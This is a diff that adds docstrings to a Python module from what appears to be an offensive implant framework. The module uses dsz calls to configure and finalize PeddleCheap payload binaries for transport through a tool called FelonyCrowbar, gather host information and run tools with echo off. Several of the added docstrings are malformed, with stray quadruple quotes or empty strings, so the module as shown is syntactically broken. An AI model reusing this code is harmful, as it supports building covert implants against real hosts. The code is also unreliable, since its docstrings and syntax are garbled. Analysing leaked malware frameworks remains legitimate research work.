@@ -14,6 +14,22 @@ import defusedxml.minidom
 
 #-----------------------------------------------------------------------------------------
 def ConfigBinary(path, file, keyLocation, extraInfo, type):
+	"""ConfigBinary:
+	Configures the binary file based on the given parameters.
+	Parameters:
+	- path (str): The path to the binary file.
+	- file (str): The name of the binary file.
+	- keyLocation (str): The location of the key file.
+	- extraInfo (str): Additional information to be included in the configuration.
+	- type (str): The type of configuration to be performed.
+	Returns:
+	- str: The configured binary file.
+	Processing Logic:
+	- Checks if the type is "level3" or if the local configuration is valid.
+	- If so, calls the _configureLocal function.
+	- If the type is "level4", calls the _configureWithFC function.
+	- Otherwise, returns an empty string."""
+	
 
 	if ((type.lower() == "level3") or pc2_2.payload.settings.CheckConfigLocal()):
 		return _configureLocal(path, file, keyLocation, extraInfo)
@@ -25,10 +41,37 @@ def ConfigBinary(path, file, keyLocation, extraInfo, type):
 
 #----------------------------------------------------------------------------
 def Finalize(payloadFile):
+	""""Finalizes the payload file and returns the finalized version."
+	Parameters:
+	- payloadFile (str): The path to the payload file.
+	Returns:
+	- str: The finalized version of the payload file.
+	Processing Logic:
+	- Uses pc2_2.payload.settings.Finalize function.
+	- Finalizes the payload file.
+	- Returns the finalized version.
+	- Only works with payload files."""
+	
 	return pc2_2.payload.settings.Finalize(payloadFile)
 
 #-----------------------------------------------------------------------------------------
 def _configureLocal(path, file, keyLocation, extraInfo):
+	"""Function:
+	_configureLocal(path, file, keyLocation, extraInfo)
+	Parameters:
+	- path (str): The path to the file to be configured.
+	- file (str): The name of the file to be configured.
+	- keyLocation (str): The location of the keys to be used in the configuration.
+	- extraInfo (str): Additional information to be used in the configuration, if applicable.
+	Returns:
+	- str: The path to the configured file.
+	Processing Logic:
+	- Gets the resources directory and appends the necessary path to the PCConfig.exe tool.
+	- Configures the payload using the specified arguments.
+	- Checks if the configured file was successfully created.
+	- Gets the final configuration for the payload.
+	- Returns the path to the configured file."""
+	
 
 	toolLoc = dsz.lp.GetResourcesDirectory()
 	ver = dsz.version.Info(dsz.script.Env["local_address"])
@@ -56,6 +99,26 @@ def _configureLocal(path, file, keyLocation, extraInfo):
 
 #-----------------------------------------------------------------------------------------
 def _configureWithFC(path, file, keyLocation, extraInfo):
+	"""This function configures a payload for transport to a machine with access to FelonyCrowbar.
+	Parameters:
+	- path (str): The path to the source files.
+	- file (str): The name of the output file.
+	- keyLocation (str): The location of the key file.
+	- extraInfo (dict): Additional host information.
+	Returns:
+	- finalFile (str): The path to the final configuration file.
+	Processing Logic:
+	- Gets additional host information.
+	- Stores the current version of PeddleCheap.
+	- Prompts for a destination path and creates necessary directories.
+	- Copies necessary files to the destination path.
+	- Creates an exec.properties file with configuration information.
+	- Prompts for execution of the configuration file.
+	- Saves the final configuration file and moves the destination path.
+	- Returns the path to the final configuration file.
+	Example:
+	finalFile = _configureWithFC("C:/SourceFiles", "Payload", "C:/KeyFile", {"Fc_Name": ["Test"], "Fc_OsFamily": ["Windows"], "Fc_Architecture": ["x86"], "hostname": ["Test-PC"], "mac": ["00:11:22:33:44:55"], "ip": ["192.168.1.1"]})"""
+	
 
 	toolLoc = dsz.lp.GetResourcesDirectory()
 	
@@ -226,6 +289,22 @@ def _configureWithFC(path, file, keyLocation, extraInfo):
 
 #-----------------------------------------------------------------------------------------
 def _copyFiles(sourceDir, destDir, mask):
+	"""Copies files from a source directory to a destination directory, filtered by a given mask.
+	Parameters:
+	- sourceDir (str): The path of the source directory.
+	- destDir (str): The path of the destination directory.
+	- mask (str): The filter for the files to be copied.
+	Returns:
+	- bool: True if the files were successfully copied, False otherwise.
+	Processing Logic:
+	- Normalize the source directory path.
+	- Get a list of files in the source directory that match the given mask.
+	- If no files are found, return False.
+	- For each file, split the path into directory and filename.
+	- Attempt to copy the file from the source directory to the destination directory.
+	- If an error occurs, return False.
+	- If all files are successfully copied, return True."""
+	
 
 	sourceDir = os.path.normpath(sourceDir)
 	
@@ -244,6 +323,16 @@ def _copyFiles(sourceDir, destDir, mask):
 
 #-----------------------------------------------------------------------------------------
 def _getDefaultPath():
+	""""Returns the default path for the destination directory if it exists, otherwise returns an empty string.
+	Parameters:
+	- None
+	Returns:
+	- str: The default path for the destination directory, or an empty string if it does not exist.
+	Processing Logic:
+	- Checks if the destination directory exists.
+	- If it exists, returns the path.
+	- If it does not exist, returns an empty string.""""
+	
 	if (dsz.env.Check(_getDestinationDir(), 0, "")):
 		return dsz.env.Get(_getDestinationDir(), 0, "")
 	else:
@@ -251,10 +340,22 @@ def _getDefaultPath():
 
 #-----------------------------------------------------------------------------------------
 def _getDestinationDir():
+	""""Returns the destination directory for the Felony Crowbar program."
+	Parameters:
+	- None
+	Returns:
+	- str: The destination directory name.
+	Processing Logic:
+	- Retrieves the destination directory name.
+	- Used for organizing files.
+	- Directory name starts with "_pc_FelonyCrowbar_Dir"."""
+	
 	return "_pc_FelonyCrowbar_Dir"
 
 #-----------------------------------------------------------------------------------------
 def _getHostInformation(extraInfo):
+	""""""
+	
 	
 	files = list()
 	while (len(files) == 0):
@@ -305,6 +406,8 @@ def _getHostInformation(extraInfo):
 
 #------------------------------------------------------------------------------------
 def _runTool(toolLoc, args):
+	""""""
+	
 	
 	# record current flags and turn echo'ing off
 	x = dsz.control.Method()
